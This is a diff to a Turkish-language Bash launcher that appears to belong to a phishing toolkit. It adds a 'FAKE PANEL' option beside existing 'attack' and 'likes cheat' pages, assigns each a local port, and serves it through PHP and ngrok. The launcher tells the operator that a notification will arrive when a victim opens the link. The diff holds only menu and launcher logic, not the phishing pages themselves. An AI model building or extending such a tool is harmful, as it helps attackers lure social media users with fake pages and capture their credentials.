@@ -64,6 +64,8 @@ $color
 
 \e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mBEĞENİ HİLESİ\e[97m
 
+\e[31m[\e[97m3\e[31m]\e[97m ────────── \e[32mFAKE PANEL\e[97m
+
 \e[31m[\e[97mK\e[31m]\e[97m ────────── \e[34mPHP & NGROK BAĞLANTIYI KES\e[97m
 
 \e[31m[\e[97mG\e[31m]\e[97m ────────── \e[34mGERİ\e[97m
@@ -213,8 +215,10 @@ if [[ -a kaydedilen.txt ]];then
 		sleep 1
 		kontrol=$(basename $(pwd))
 		if [[ $kontrol == attack ]];then
-			port="4444"
+			port="4141"
 		elif [[ $kontrol == begeni ]];then
+			port="4242"
+		elif [[ $kontrol == fake-panel ]];then
 			port="4343"
 		fi
 		bash index.sh -bg -p $port
@@ -250,7 +254,7 @@ read -e -p $'\e[31m───────[ \e[97mSEÇENEK GİRİNİZ\e[31m ]─�
 if [[ $secim == 1 ]];then
 	cd files/attack
 	bulunan
-	bash index.sh -bg -p 4444
+	bash index.sh -bg -p 4141
 	echo
 	echo
 	echo
@@ -265,6 +269,22 @@ if [[ $secim == 1 ]];then
 	dongu
 elif [[ $secim == 2 ]];then
 	cd files/begeni
+	bulunan
+	bash index.sh -bg -p 4242
+	echo
+	echo
+	echo
+	printf "\e[33m[*]\e[97m LİNKE GİRDİ OLURSA BİLDİRİM İLE HABER VERİLECEK"
+	echo
+	echo
+	echo
+	printf "BAĞLANTIYI KESMEK İÇİN \e[31m>> \e[97m[\e[31m CTRL C \e[97m]"
+	echo
+	echo
+	echo
+	dongu
+elif [[ $secim == 3 ]];then
+	cd files/fake-panel
 	bulunan
 	bash index.sh -bg -p 4343
 	echo
